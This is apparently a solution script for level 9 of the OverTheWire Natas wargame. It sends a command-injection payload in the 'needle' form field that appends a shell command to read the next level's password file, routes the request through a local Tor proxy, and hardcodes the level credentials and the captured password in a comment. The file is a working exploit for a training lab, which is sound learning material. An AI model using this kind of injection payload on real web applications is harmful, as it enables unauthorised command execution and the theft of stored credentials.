#!/usr/bin/python3

import requests
import re





name = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'

url = 'http://%s.natas.labs.overthewire.org/' %name

proxies = {'http': "socks5://127.0.0.1:9050"}

resp = requests.post(url, data= {"needle":"app /dev/null; less /etc/natas_webpass/natas10 #", "submit":"submit"}, auth=(name,password), proxies=proxies)

content = resp.text
print(content)
# flag = re.findall('<pre (.*) pre>', content)
# print(flag)

# this will print only the actual password without brackets
# print(str(flag)[2:-2])
# D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
